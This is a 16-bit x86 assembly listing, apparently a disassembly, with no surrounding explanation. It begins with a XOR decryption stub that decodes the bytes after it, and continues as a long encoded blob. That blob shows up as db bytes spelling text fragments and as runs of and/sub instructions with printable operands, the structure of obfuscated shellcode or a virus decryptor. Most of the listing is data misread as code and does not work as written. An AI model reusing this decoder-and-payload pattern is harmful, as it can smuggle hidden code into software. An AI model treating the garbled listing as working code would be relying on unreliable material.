    db 0x8B, 0xF0 ;$1 mov si, ax
    add si, word 0x001e
    mov cx, 0x0028
    xor word [si], 0x1313
    xor word [si+0x02], 0x1313
    add si, 0x0004
loop1:
    xor word [si], 0x1313
    add si, 0x0002
    loop loop1
    stosw
    call 1326
    or al, 0x9f
    esc 0xd9
    popf
    db 0xC1
    xchg dx, ax
    rcl word [bp+si], 1
    push ds
    stosb
    adc si, [bp+di]
    scasw
    and dl, [0x169a]
    call 0xa913:0x1105
    adc [bp+di], dx
    in al, dx
    or al, 0x4e
    db 0x65
    db 0x62
    jnz label2
    db 0x68
    db 0x61
    db 0x64
    db 0x6E
    db 0x65
    jp label5
    db 0x61
    jb label1
    and [bx+di+0x6b], ah
    db 0x61
    and [bp+0x61], al
    jz label3+1
    db 0x68
    db 0x65
    cs:
    or al, [bp+0x61]
    jz label4+2
    db 0x68
    db 0x65
    and [bp+0x69], ah
    jz label6
    db 0x68
    db 0x65
    and [di+0x69], ch
    jnb label7+1
    db 0x65
    aas
    and [bp+0x61], ah
    jz label8
    db 0x68
    db 0x65
    and [bp+0x69], ah
    jz label9+2
    db 0x68
    db 0x65
    and [bx+di+0x61], bh
label1:
    db 0x6E
    db 0x6B
    db 0x6F
    cs:
    and [bp+0x61], al
    db 0x63
    jz label10
    db 0x68
    db 0x65
    and [bp+0x69], ah
    jz label11+1
    db 0x68
    db 0x65
    and [bp+di+0x6f], ch
    jb label12+3
    jz label16
    db 0x61
    and [bx+di], sp
    and [bp+si], cx
    push bx
    db 0x61
    jb label13
    and [bx+0x6f], al
    db 0x6C
label2:
    db 0x64
    db 0x62
    db 0x65
    jb label15+1
    and [bx+di+0x73], ch
    and [si+0x68], dh
    db 0x65
    and [si+0x65], ah
    jbe label18
    db 0x6C
label3:
    sub al, 0x20
    ja label17
    db 0x6E
    db 0x6E
    db 0x61
label4:
    and [bp+di+0x68], ah
    db 0x65
    db 0x63
label5:
    db 0x6B
    and [bx+di+0x74], ch
label6:
    and [bx+0x75], ch
    jz label14+1
    and [bx+0x5f], ch
    dec di
    or ah, [bx]
label7:
    and ax, 0x2925
label8:
    daa
    sub [bx+si], bp
    and bp, [si]
label9:
    sub ah, [0x2c25]
    sub sp, [bx+di]
    and [si], sp
    daa
    and ch, [bp+si]
    and al, 0x29
    sub al, 0x21
    sub al, 0x25
label10:
    sub [0x2425], ah
    sub al, 0x22
label11:
    sub sp, [bx]
    sub [bp+di], ch
    sub [bp+di], ch
    and [bp+di], sp
    es:
    sub [bp+si], bp
label12:
    and ah, [0x252a]
    and bp, [bp+si]
label13:
    es:
    and ax, 0x2b22
    sub al, 0x29
    and al, 0x2b
label14:
    and bp, [bp+di]
    and [bx+di], sp
    and al, 0x21
label15:
    sub [bp+di], ch
label16:
    daa
    es:
    sub [di], ch
    and bp, [bp+di]
    sub ah, [0x2523]
label17:
    daa
    sub al, 0x2a
label18:
    es:
    sub [bx+si], ch
    and al, 0x2a
    sub [bp+di], bp
    and ax, 0x2c2d
    sub sp, [si]
    sub bp, [di]
    sub ah, [0x222c]
    sub [si], bp
    sub [bx], sp
    sub ah, [bx+di]
    and al, 0x23
    es:
    and ax, 0x2726
    and [si], bp
    es:
    and ch, [bx+si]
    sub ch, [di]
    and ax, 0x2c2a
    sub ax, 0x2429
    and al, 0x29
    and al, 0x28
    sub sp, [si]
    sub [si], ch
    sub sp, [di]
    es:
    and bp, [bp+di]
    and al, 0x2c
    daa
    and sp, [0x242c]
    sub ax, 0x282c
    sub sp, [0x232b]
    sub [bx], sp
    sub ah, [bx+di]
    sub ax, 0x2528
    and al, 0x23
    sub al, 0x23
    sub [si], ah
    es:
    sub al, 0x2b
    es:
    sub ax, 0x2323
    and bp, [si]
    sub [bx], sp
    sub [bp+di], ch
    and [bx], sp
    daa
    and ch, [bp+si]
    sub ch, [si]
    sub [bx+di], sp
    sub [bp+di], bp
    and ax, 0x2224
    and al, 0x26
    sub [di], ah
    sub sp, [bx]
    and al, 0x25
    and ax, 0x222a
    and ah, [di]
    daa
    sub ah, [bx]
    and sp, [0x2b28]
    es:
    and ax, 0x222d
    sub ax, 0x2d2c
    sub [di], sp
    sub ah, [bp+di]
    sub ax, 0x272c
    and [bp+di], bp
    and bp, [di]
    and ah, [bx]
    daa
    sub ax, 0x2227
    and [bp+di], bp
    and [di], sp
    and al, 0x22
    sub sp, [bx]
    es:
    daa
    sub al, 0x25
    and [si], bp
    and al, 0x2d
    sub ax, 0x2c24
    daa
    sub ah, [bp+si]
    sub ax, 0x292c
    and al, 0x24
    and ah, [0x2622]
    daa
    and al, 0x23
    sub al, 0x29
    and ah, [bp+di]
    sub ch, [bp+si]
    and ch, [di]
    daa
    sub ax, 0x252a
    es:
    sub [bx+si], ch
    sub [bx+di], ch
    and ax, 0x222d
    and sp, [di]
    sub [bp+di], ah
    sub ax, 0x2d2d
    daa
    sub ax, 0x2723
    and [bp+di], bp
    and al, 0x2d
    and [bp+di], bp
    db 0x2B  ; sub ax, [bx+si]